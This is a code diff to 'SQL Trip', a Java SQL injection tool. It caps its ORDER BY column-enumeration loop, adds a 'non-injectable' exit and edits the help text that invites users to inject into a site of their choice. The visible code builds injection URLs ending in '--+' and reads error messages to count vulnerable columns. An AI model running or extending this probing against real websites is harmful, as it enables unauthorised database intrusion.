@@ -34,7 +34,12 @@ System.out.print("\n\n Starting SQL Trip...Please wait... ");
 Thread.sleep(2000);
 System.out.print("\n\n Started...\n\n");
 int vulncolscount=orderbyclausecheck(url);
-System.out.print(ConsoleColors.CYAN_BOLD+"\n\n\n\n THERE ARE "+vulncolscount+" VULNERABLE COLUMNS"+ConsoleColors.RESET);
+if(vulncolscount==-1)
+{System.out.print(ConsoleColors.RED_BOLD+"\n\n "+url.getQuery()+" SEEMS TO BE NON-INJECTABLE.. TRY WITH DIFERENT PARAMETERS.. \n\n"+ConsoleColors.RESET);
+System.out.print(ConsoleColors.RED_BOLD+"\n\n SQL Trip Stopped... Please Try Again "+ConsoleColors.RESET);System.out.print("\n\n");
+System.exit(0);}
+else{ 
+System.out.print(ConsoleColors.CYAN_BOLD+"\n\n\n\n THERE ARE "+vulncolscount+" VULNERABLE COLUMNS"+ConsoleColors.RESET);}
 Thread.sleep(3000);
 String urlworkwith=url.toString();
 String s=urlworkwith; String end="--+";String s1="";
@@ -137,7 +142,7 @@ BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
 System.out.print(ConsoleColors.CYAN+"\n (Confused ? Just Type http://xyz.xyz --> Press Enter --> Type help in next menu)"+ConsoleColors.RESET);
 while(flag==false)
 {
-System.out.print(ConsoleColors.BLUE_BOLD_BRIGHT+"\n\n Enter URL followed by parameter :\t"+ConsoleColors.RESET);
+System.out.print(ConsoleColors.BLUE_BOLD+"\n\n Enter URL followed by parameter :\t"+ConsoleColors.RESET);
 int count=0;
 String b ="";
 inputuu=br.readLine();
@@ -171,12 +176,11 @@ System.out.print("\f");
 System.out.print(ConsoleColors.YELLOW_BOLD+"\n\t\t\t\t\t========================================"+ConsoleColors.RESET);
 System.out.print("\n\t\t\t\t\tThis is SQL Trip... A SQL Injection Tool ");
 System.out.print(ConsoleColors.YELLOW_BOLD+"\n\t\t\t\t\t========================================\n"+ConsoleColors.RESET);
-System.out.print(ConsoleColors.GREEN_BRIGHT+"\n \n HELP MENU:-"+ConsoleColors.RESET);
+System.out.print("\n \n HELP :-");
 System.out.print("\n \n This is SQL Trip.");
-System.out.print("\n \n Help for \"Enter URL followed by parameter :\"");
-System.out.print("\n \n Here write the complete HTTP URL of the site you want to perform SQL Injection.");
-System.out.print("\n \n Valid Injectable parameter is necessary for appropriate results of Injection.");
-System.out.print("\n \n For SQL Injection Parameters refer to https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)#Standard_SQL_Injection_Testing");
+System.out.print("\n \n Enter URL followed by parameter :");
+System.out.print("\n Here write the complete HTTP URL of the site you want to perform SQL Injection.");
+System.out.print("\n Valid Injectable parameter is necessary for appropriate results of Injection.");
 System.out.print("\n \n Then Just Press \"Y\". Sit back and enjoy SQL Trip doing its work... ");
 System.out.print("\n \n After Program Stops, Check for html files generated in the same directory."); 
 System.out.print("\n \n \n\n Press Enter To go to Main Program... \n\n ||||||||||||||||||||||||||||||||||||| \t");
@@ -194,7 +198,7 @@ c=s+" order by ";
 int count=1;
 System.out.print(ConsoleColors.PURPLE_BOLD+"\n\n\n SQL Trip CHECKING FOR VULNERABLE COLUMNS "+ConsoleColors.RESET);
 
-while(flag==false)
+while(flag==false && count<=10)
 {
 c=c+count;
 d=c+end;
@@ -222,6 +226,10 @@ if((urlString.indexOf("Error"))>=0 || (urlString.indexOf("ERROR"))>=0 || (urlStr
 {flag=true;}
 c=c+",";
 count++;
+}
+if(count==11)
+{
+return -1;
 }
 return (count-2);  
 }
